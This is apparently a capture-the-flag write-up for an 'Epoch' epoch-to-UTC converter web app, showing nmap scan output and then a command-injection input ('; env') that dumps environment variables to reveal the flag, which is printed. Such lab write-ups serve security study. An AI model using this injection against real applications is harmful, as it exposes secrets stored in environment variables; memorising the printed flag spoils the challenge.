
# CTF Writeup: Epoch

---
## Reconaissance

An initial scan revealed the following running services on the server.

```
nmap -n -Pn -sS -p- 10.113.176.139         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 15:03 CDT
Nmap scan report for 10.113.176.139
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```

An more detailled scan revealed information about the running services.

```
nmap -n -Pn -sSCV -p 22,80 10.113.176.139
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 15:04 CDT
Nmap scan report for 10.113.176.139
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5d:d5:b9:13:3a:3c:57:1b:3b:a6:4f:6b:de:52:5d:21 (RSA)
|   256 ee:e4:4e:8c:91:75:e3:12:fa:6c:4f:d7:a2:78:88:26 (ECDSA)
|_  256 ce:ef:dc:bc:7b:a0:3f:40:e5:27:9a:5a:32:d0:a2:ab (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 06 May 2026 20:04:32 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1184
|     Connection: close
|     <!DOCTYPE html>
|     <head>
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
|     <style>
|     body,
|     html {
|     height: 100%;
|     </style>
|     </head>
|     <body>
|     <div class="container h-100">
|     <div class="row mt-5">
|     <div class="col-12 mb-4">
|     class="text-center">Epoch to UTC convertor 
|     </h3>
|     </div>
|     <form class="col-6 mx-auto" action="/">
|     <div class=" input-group">
|     <input name="epoch" value="" type="text" class="form-control" placeholder="Epoch"
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Wed, 06 May 2026 20:04:32 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|_    Method Not Allowed
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=5/6%Time=69FB9ED1%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,529,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2006\x20May\x202026
SF:\x2020:04:32\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\n
SF:Content-Length:\x201184\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n\n<head>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"htt
SF:ps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min\
SF:.css\"\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\"sha384-JcKb8q3iqJ61
SF:gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\"\x20crossorigin=
SF:\"anonymous\">\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20}\n\x20\x20\x20\x20</style>\n</head>\n\n<body>\n\x20\x20\x20\x2
SF:0<div\x20class=\"container\x20h-100\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<div\x20class=\"row\x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<div\x20class=\"col-12\x20mb-4\">\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\"text-center\">Epoc
SF:h\x20to\x20UTC\x20convertor\x20\xe2\x8f\xb3</h3>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20<form\x20class=\"col-6\x20mx-auto\"\x20action=\"/\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"\x20input-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"epoch\"\x20value=\"\"
SF:\x20type=\"text\"\x20class=\"form-control\"\x20placeholder=\"Epoch\"\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:")%r(HTTPOptions,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDa
SF:te:\x20Wed,\x2006\x20May\x202026\x2020:04:32\x20GMT\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET
SF:,\x20HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed")%r(R
SF:TSPRequest,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x2
SF:0Wed,\x2006\x20May\x202026\x2020:04:32\x20GMT\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20H
SF:EAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.88 seconds
```

Since the CTF itself gives us information about Command Injection and that the developer stores the flag inside environment variables. I utilized the following command to gain the flag.

```
dwqdwqdwqd; env
```

```
flag{7da6c7debd40bd611560c13d8149b647}
```

